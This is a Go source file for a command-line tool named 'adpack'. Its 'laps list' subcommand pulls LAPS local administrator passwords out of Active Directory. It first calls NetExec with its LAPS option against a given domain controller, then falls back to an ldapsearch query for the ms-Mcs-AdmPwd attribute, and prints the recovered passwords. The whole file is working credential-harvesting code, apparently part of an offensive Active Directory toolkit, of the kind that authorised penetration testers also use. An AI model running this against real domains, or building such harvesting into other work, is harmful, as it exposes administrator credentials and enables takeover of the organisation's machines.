package cmd

import (
	"adpack/utils"
	"fmt"

	"github.com/spf13/cobra"
)

var lapsDCIP, lapsUser, lapsPass, lapsDomain string

var lapsCmd = &cobra.Command{
	Use: "laps", Short: "LAPS password enumeration",
}

var lapsListCmd = &cobra.Command{
	Use: "list", Short: "Read LAPS passwords from computer objects",
	RunE: func(cmd *cobra.Command, args []string) error {
		if lapsDomain == "" {
			return fmt.Errorf("--domain is required")
		}
		utils.Step("Enumerating LAPS passwords...")
		result := utils.RunCommand("nxc", "ldap", lapsDCIP, "-u", lapsUser, "-p", lapsPass, "--laps")
		if !result.Success {
			utils.StepInfo("nxc laps failed, trying ldapsearch...")
			result = utils.RunCommand("ldapsearch", "-H", fmt.Sprintf("ldap://%s", lapsDCIP),
				"-D", fmt.Sprintf("%s@%s", lapsUser, lapsDomain), "-w", lapsPass,
				"-b", buildBaseDN(lapsDomain), "(ms-Mcs-AdmPwd=*)", "sAMAccountName", "ms-Mcs-AdmPwd")
			if !result.Success {
				return fmt.Errorf("LAPS enumeration failed: %s", result.Stderr)
			}
		}
		fmt.Println(result.Stdout)
		return nil
	},
}

func init() {
	lapsCmd.PersistentFlags().StringVar(&lapsDCIP, "dc-ip", "", "Domain controller IP")
	lapsCmd.PersistentFlags().StringVar(&lapsDomain, "domain", "", "Domain name (e.g., domain.local)")
	lapsCmd.PersistentFlags().StringVar(&lapsUser, "user", "", "Username")
	lapsCmd.PersistentFlags().StringVar(&lapsPass, "password", "", "Password")
	lapsCmd.AddCommand(lapsListCmd)
	rootCmd.AddCommand(lapsCmd)
}
